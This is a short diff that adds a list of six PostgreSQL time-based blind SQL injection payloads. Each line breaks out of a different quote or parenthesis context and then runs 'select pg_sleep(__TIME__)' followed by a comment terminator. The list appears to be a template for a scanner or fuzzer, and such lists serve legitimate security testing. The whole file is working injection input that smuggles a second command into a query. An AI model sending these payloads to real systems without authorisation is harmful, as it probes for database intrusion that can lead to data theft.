@@ -1,0 +1,6 @@
+;select pg_sleep(__TIME__); --[space]
+';select pg_sleep(__TIME__); --[space]
+);select pg_sleep(__TIME__); --[space]
+');select pg_sleep(__TIME__); --[space]
+));select pg_sleep(__TIME__); --[space]
+'));select pg_sleep(__TIME__); --[space]
